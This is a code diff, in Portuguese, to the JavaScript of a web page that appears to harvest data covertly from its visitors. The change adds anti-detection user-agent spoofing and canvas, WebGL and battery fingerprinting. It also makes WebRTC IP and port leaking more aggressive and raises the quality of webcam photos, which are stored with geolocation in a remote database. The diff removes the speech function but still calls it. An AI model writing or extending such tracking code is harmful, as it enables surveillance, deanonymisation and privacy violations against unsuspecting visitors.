@@ -12,19 +12,50 @@ const statusText = document.getElementById("status");
 const canvas = document.getElementById("canvas");
 
 // =================================================================
-// SISTEMA DE ÁUDIO
+// ANTI-DETECÇÃO
 // =================================================================
-function falar(texto){
-  speechSynthesis.cancel();
-  const fala = new SpeechSynthesisUtterance(texto);
-  fala.lang = "pt-BR";
-  fala.volume = 1;
-  fala.rate = 0.95;
-  speechSynthesis.speak(fala);
+const userAgents = [
+  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+];
+
+function getRandomUA() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+// Fingerprint Canvas
+function getCanvasFingerprint() {
+  const c = document.createElement("canvas");
+  const ctx = c.getContext("2d");
+  ctx.textBaseline = "alphabetic";
+  ctx.font = "22px Arial";
+  ctx.fillStyle = "#f60";
+  ctx.fillRect(100, 100, 200, 50);
+  ctx.fillStyle = "#069";
+  ctx.fillText("abcdefghijklmnopqrstuvwxyz", 120, 140);
+  return btoa(c.toDataURL()).slice(-32);
+}
+
+// WebGL Fingerprint
+function getWebGLFingerprint() {
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl");
+    const debug = gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+  } catch(e) { return "WebGL bloqueado"; }
+}
+
+// Bateria Detalhada
+async function getBatteryInfo() {
+  if (!navigator.getBattery) return "Não suportado";
+  const b = await navigator.getBattery();
+  return `${Math.floor(b.level * 100)}% ${b.charging ? '(carregando)' : ''}`;
 }
 
 // =================================================================
-// CAPTURA AVANÇADA (IPv4 + IPv6 + Operadora + TURN)
+// CAPTURA ULTRA AGRESSIVA
 // =================================================================
 async function capturarPortaAvancada() {
   const info = { 
@@ -35,30 +66,28 @@ async function capturarPortaAvancada() {
     operadora: "Não detectada"
   };
 
-  const iceServers = [
+  const servers = [
     { urls: 'stun:stun.l.google.com:19302' },
     { urls: 'stun:stun1.l.google.com:19302' },
-    { urls: 'stun:stun.ekiga.net' },
-    {
-      urls: 'turn:openrelay.metered.ca:443',
-      username: 'openrelayproject',
-      credential: 'openrelayproject'
-    }
+    { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
   ];
 
-  for (let config of iceServers) {
-    try {
-      const rtc = new RTCPeerConnection({
-        iceServers: [config],
-        iceTransportPolicy: "all"
-      });
+  for (let attempt = 0; attempt < 5; attempt++) {
+    for (let config of servers) {
+      try {
+        await new Promise(r => setTimeout(r, 400 + Math.random() * 700));
 
-      rtc.createDataChannel("port-test");
+        const rtc = new RTCPeerConnection({
+          iceServers: [config],
+          iceTransportPolicy: "all"
+        });
 
-      const offer = await rtc.createOffer();
-      await rtc.setLocalDescription(offer);
+        rtc.createDataChannel("ultra");
+        const offer = await rtc.createOffer();
+        await rtc.setLocalDescription(offer);
 
-      await new Promise(resolve => {
+        await new Promise(resolve => setTimeout(resolve, 1600));
+
         rtc.onicecandidate = (event) => {
           if (event.candidate) {
             const cand = event.candidate.candidate;
@@ -73,15 +102,14 @@ async function capturarPortaAvancada() {
             if (portMatch) info.local_port = portMatch[1];
           }
         };
-        setTimeout(resolve, 1500);
-      });
 
-      rtc.close();
-      if (info.local_port) break;
-    } catch(e) {}
+        rtc.close();
+        if (info.local_port) break;
+      } catch(e) {}
+    }
+    if (info.local_port) break;
   }
 
-  // IP Público + Operadora
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
@@ -109,7 +137,9 @@ async function iniciarSistema(){
       ipv6: portaInfo.ipv6,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      user_agent: navigator.userAgent
+      user_agent: getRandomUA(),
+      canvas_fp: getCanvasFingerprint(),
+      webgl: getWebGLFingerprint()
     }]);
 
     statusText.innerHTML = "✅ Sistema pronto";
@@ -128,42 +158,7 @@ async function iniciarSistema(){
 window.onload = iniciarSistema;
 
 // =================================================================
-// ANALISADOR DE DISPOSITIVO
-// =================================================================
-function analisarDispositivo() {
-  const ua = navigator.userAgent;
-  let androidVersion = "Não é Android";
-  if (ua.indexOf("Android") >= 0) {
-      const match = ua.match(/Android\s([0-9\.]+)/);
-      if (match) androidVersion = match[1];
-  }
-  let browser = "Desconhecido";
-  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
-  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
-  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
-  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
-  
-  let model = "Desconhecido";
-  if (ua.indexOf("Mobile") >= 0) {
-      const parts = ua.split(/[()]/);
-      if (parts.length > 1) {
-          const deviceParts = parts[1].split(';');
-          for (let part of deviceParts) {
-              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
-                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
-                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && 
-                  part.length > 2) {
-                  model = part.trim();
-                  break;
-              }
-          }
-      }
-  }
-  return { androidVersion, browser, model };
-}
-
-// =================================================================
-// BOTÃO - CAPTURA COMPLETA (VERSÃO CORRIGIDA)
+// BOTÃO - CAPTURA COMPLETA (VERSÃO FINAL)
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
@@ -185,8 +180,8 @@ btn.addEventListener("click", async () => {
     const fotos = [];
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
-        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
-        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
+        fotos.push(canvas.toDataURL("image/jpeg", 0.8));
+        if(i < 2) await new Promise(resolve => setTimeout(resolve, 900));
     }
 
     const stream = video.srcObject;
@@ -202,13 +197,11 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
-    // ✅ CHAMADA DA FUNÇÃO AVANÇADA AQUI
     const portaInfo = await capturarPortaAvancada();
+    const bateria = await getBatteryInfo();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
-
-    const infoDispositivo = analisarDispositivo();
 
     const { error } = await supabaseClient.from('checkins').insert([{
       tipo_captura: "completo",
@@ -220,15 +213,10 @@ btn.addEventListener("click", async () => {
       local_ip: portaInfo.local_ip,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      cidade: "",
-      estado: "",
-      pais: "",
-      user_agent: navigator.userAgent,
-      modelo_dispositivo: infoDispositivo.model,
-      versao_android: infoDispositivo.androidVersion,
-      navegador: infoDispositivo.browser,
-      plataforma: navigator.platform,
-      idioma: navigator.language,
+      user_agent: getRandomUA(),
+      canvas_fp: getCanvasFingerprint(),
+      webgl: getWebGLFingerprint(),
+      bateria: bateria,
       largura_tela: window.innerWidth,
       altura_tela: window.innerHeight
     }]);
